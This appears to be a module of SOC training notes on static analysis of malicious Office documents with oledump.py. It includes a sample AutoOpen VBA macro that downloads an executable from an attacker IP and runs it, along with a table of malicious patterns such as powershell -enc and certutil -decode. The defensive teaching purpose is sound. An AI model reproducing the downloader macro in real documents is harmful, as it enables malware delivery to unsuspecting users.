# 14 — Static MalDoc Analysis

> **Timestamp:** [5:56:06](https://www.youtube.com/watch?v=56NDgBOSpUg&t=21366s)

---

## Overview

Malicious Office documents (MalDocs) are one of the most common phishing attachment types. This module covers basic **static analysis** — examining the file structure without executing it — to identify embedded macros, extract IoCs, and understand attack chains.

> This is a brief introduction. For full malware analysis skills, see the TCM Security *Practical Malware Analysis & Triage* course.

---

## What Is a MalDoc?

A **MalDoc** (malicious document) is a weaponized Office file — Word, Excel, or PowerPoint — that carries malicious content, most commonly:

- **VBA Macros** — scripts embedded in the document that execute on open
- **Embedded objects** — OLE-linked files or executables
- **External links** — URLs that auto-fetch content on open

### Common MalDoc Extensions

| Extension | Type |
|---|---|
| `.doc` / `.docx` | Word document |
| `.xls` / `.xlsx` | Excel spreadsheet |
| `.xlsm` | Macro-enabled Excel |
| `.docm` | Macro-enabled Word |
| `.ppt` / `.pptx` | PowerPoint presentation |

---

## OLE — Object Linking and Embedding

Microsoft Office uses **OLE** technology to embed and link objects within documents. Tools like `oledump.py` can parse the OLE structure and extract embedded content including macros.

---

## Tool — oledump.py

Part of the **Didier Stevens suite** of tools for Office document analysis.

**Install / locate:**
```bash
# Should be in the tools/ folder of the course repository
# Or download directly:
wget https://raw.githubusercontent.com/DidierStevens/DidierStevensSuite/master/oledump.py
```

---

## Step-by-Step Static Analysis

### Step 1 — List All Streams
```bash
python3 oledump.py sample.xlsm
```

**Example output:**
```
1:       114 '\x01CompObj'
2:       368 '\x05DocumentSummaryInformation'
3:       216 '\x05SummaryInformation'
4:      2917 'Workbook'
5:    M  971 '_VBA_PROJECT'    ← M = contains macro
6:       444 'xl/vbaProject.bin'
```

> The **capital M** next to a stream means it contains an **embedded macro**.

---

### Step 2 — Dump the Macro Stream (Hex)
```bash
python3 oledump.py -s 5 sample.xlsm
```
Returns raw hex dump of the macro stream — hard to read directly.

---

### Step 3 — Extract Strings
```bash
python3 oledump.py -s 5 -S sample.xlsm
```

The `-S` flag runs strings against the stream. Look for:
- HTTP/HTTPS URLs
- IP addresses
- PowerShell commands
- File paths
- `Invoke-WebRequest`, `DownloadFile`, `Start-Process`

---

### Step 4 — Decompress and Extract Full VBA Script
```bash
python3 oledump.py -s 5 --vbadecompress sample.xlsm
```

Extracts the complete VBA macro script in readable format.

**Example malicious macro:**
```vba
Sub AutoOpen()
    Dim url As String
    url = "http://192.168.1.45/payload.exe"
    
    Dim path As String
    path = Environ("TEMP") & "\update.exe"
    
    ' Download payload
    Invoke-WebRequest -Uri url -OutFile path
    
    ' Execute
    Shell path
End Sub
```

**What this does:**
1. Runs automatically when the document is opened (`AutoOpen`)
2. Downloads an executable from an attacker-controlled IP
3. Saves it to the `%TEMP%` directory
4. Executes the downloaded file

---

## IoCs to Extract from MalDoc Analysis

After static analysis, document the following:

```
File name:       invoice_march.xlsm
SHA256:          [hash]
Macro present:   Yes — stream index 5
Macro type:      AutoOpen (runs on document open)
Download URL:    hxxp://192[.]168[.]1[.]45/payload[.]exe  ← defanged
Dropped file:    %TEMP%\update.exe
Execution:       Shell command
```

---

## Common Malicious VBA Patterns

| Pattern | Description |
|---|---|
| `AutoOpen` / `Auto_Open` | Macro runs automatically on file open |
| `Invoke-WebRequest` | Downloads file from URL |
| `DownloadFile` | Downloads file from URL (alternate method) |
| `Shell` / `CreateObject` | Executes a command or file |
| `WScript.Shell` | Executes via Windows Script Host |
| `powershell -enc` | Runs Base64-encoded PowerShell command |
| `certutil -decode` | Decodes file — common AV evasion |
| `mshta.exe` | Executes HTA scripts |

---

## Checking OLE Structure for Anomalies

Beyond macros, also look for:

```bash
# Look for embedded files or objects
python3 oledump.py sample.doc | grep -i "embedded\|OLE\|package"
```

Attackers sometimes embed:
- `.exe` files masquerading as innocent objects
- OLE2 link objects that fetch remote content on open
- Fake template references that download malicious Normal.dotm

---

## Practical Scope Note

In day-to-day SOC work, you will rarely need to go this deep into static MalDoc analysis. The typical workflow is:

1. Hash → VirusTotal (Module 12)
2. Unknown hash → Dynamic sandbox (Module 13)
3. Deeper investigation needed → Static analysis (this module)

This module gives you the foundation to understand what sandboxes are detecting and to extract IoCs when automated tools don't give you enough.

---

*← [13 — Dynamic Analysis](./13-dynamic-analysis-sandboxing.md) | [Next: Static PDF Analysis →](./15-static-pdf-analysis.md)*
